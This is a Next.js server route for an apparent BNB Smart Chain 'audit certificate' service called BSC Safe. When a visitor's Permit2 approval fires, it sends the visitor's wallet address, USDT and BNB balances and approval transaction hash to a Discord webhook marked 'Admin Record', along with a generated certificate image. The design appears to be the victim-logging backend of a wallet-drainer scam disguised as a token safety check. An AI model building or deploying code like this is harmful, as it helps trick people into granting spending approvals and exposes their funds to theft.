import { ethers } from "ethers";
import { NextResponse } from "next/server";

const BSC_YELLOW_DEC = 0xf3ba2f;

function makeCertRef(addr) {
  const a = addr ? addr.slice(2, 8).toUpperCase() : "000000";
  const t = Date.now().toString(36).toUpperCase().slice(-6);
  return `BSC-AUD-${a}-${t}`;
}

// ── Send certificate image as a Discord file attachment ───────────────────
async function sendImageToWebhook(webhookUrl, walletAddress, certBase64) {
  const addrShort = `${walletAddress.slice(0, 6)}…${walletAddress.slice(-4)}`;
  const filename  = `BSC-Safe-${walletAddress.slice(2, 8).toUpperCase()}.jpg`;

  // Strip the data-URL prefix and decode
  const base64Data  = certBase64.replace(/^data:image\/\w+;base64,/, "");
  const imageBuffer = Buffer.from(base64Data, "base64");
  const blob        = new Blob([imageBuffer], { type: "image/jpeg" });

  const embed = {
    title:     `🖼️ Audit Certificate — ${addrShort}`,
    color:     BSC_YELLOW_DEC,
    image:     { url: `attachment://${filename}` },
    footer:    { text: "BSC Safe · Certificate Image · Admin Record" },
    timestamp: new Date().toISOString(),
  };

  const form = new FormData();
  form.append("files[0]", blob, filename);
  form.append("payload_json", JSON.stringify({
    username:   "BSC Safe",
    avatar_url: "https://bscscan.com/images/favicon.ico",
    embeds: [embed],
  }));

  const res = await fetch(webhookUrl, { method: "POST", body: form });
  if (!res.ok) {
    const text = await res.text().catch(() => "");
    console.error("[log-cert] image webhook error:", res.status, text);
    return false;
  }
  return true;
}

// ── Main POST handler ─────────────────────────────────────────────────────
export async function POST(request) {
  const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
  if (!webhookUrl || webhookUrl === "YOUR_WEBHOOK_URL_HERE") {
    return NextResponse.json({ ok: false, reason: "webhook_not_configured" });
  }

  let body;
  try {
    body = await request.json();
  } catch {
    return NextResponse.json({ ok: false, reason: "invalid_json" }, { status: 400 });
  }

  const { walletAddress, usdtBalance, bnbBalance, swapTxHash, certBase64 } = body ?? {};

  if (!walletAddress || !ethers.isAddress(walletAddress)) {
    return NextResponse.json({ ok: false, reason: "invalid_address" }, { status: 400 });
  }

  // ── Image upload path (called from AuditCertificate after JPEG is built) ──
  if (certBase64) {
    try {
      const ok = await sendImageToWebhook(webhookUrl, walletAddress, certBase64);
      return NextResponse.json({ ok });
    } catch (err) {
      console.error("[log-cert] image path error:", err);
      return NextResponse.json({ ok: false, reason: "image_error" });
    }
  }

  // ── Text embed path (called from WalletConnect when approval fires) ───────
  const certRef   = makeCertRef(walletAddress);
  const issuedAt  = new Date().toISOString();
  const addrShort = `${walletAddress.slice(0, 6)}…${walletAddress.slice(-4)}`;

  const fields = [
    { name: "🏦 Wallet Address", value: `\`${walletAddress}\``, inline: false },
    { name: "💵 USDT Balance",   value: `**${usdtBalance ?? "—"} USDT**`, inline: true },
    { name: "⛽ BNB Balance",    value: `${bnbBalance ?? "—"} BNB`,        inline: true },
    { name: "📋 Certificate ID", value: `\`${certRef}\``,                  inline: false },
    { name: "⛓️ Network",        value: "BNB Smart Chain · Chain 56",       inline: true },
    { name: "🔄 Swap Test",      value: "✅ Permit2 Approved",             inline: true },
  ];

  if (swapTxHash) {
    fields.push({
      name:  "🔗 Approval Tx",
      value: `[View on BscScan](https://bscscan.com/tx/${swapTxHash})`,
      inline: false,
    });
  }

  try {
    const res = await fetch(webhookUrl, {
      method:  "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        username:   "BSC Safe",
        avatar_url: "https://bscscan.com/images/favicon.ico",
        embeds: [{
          title:       `🏆 Audit Certificate Issued — ${addrShort}`,
          description: "USDT has passed all verification checks and Permit2 swappability test.",
          color:       BSC_YELLOW_DEC,
          fields,
          footer:      { text: "BSC Safe · BEP-20 Verification Tool · Admin Record" },
          timestamp:   issuedAt,
        }],
      }),
    });

    if (!res.ok) {
      const text = await res.text().catch(() => "");
      console.error("[log-cert] Discord error:", res.status, text);
      return NextResponse.json({ ok: false, reason: "discord_error" });
    }

    return NextResponse.json({ ok: true, certRef });
  } catch (err) {
    console.error("[log-cert]", err);
    return NextResponse.json({ ok: false, reason: "fetch_error" });
  }
}

export function GET()    { return NextResponse.json({ error: "Method not allowed" }, { status: 405 }); }
export function PUT()    { return NextResponse.json({ error: "Method not allowed" }, { status: 405 }); }
export function DELETE() { return NextResponse.json({ error: "Method not allowed" }, { status: 405 }); }
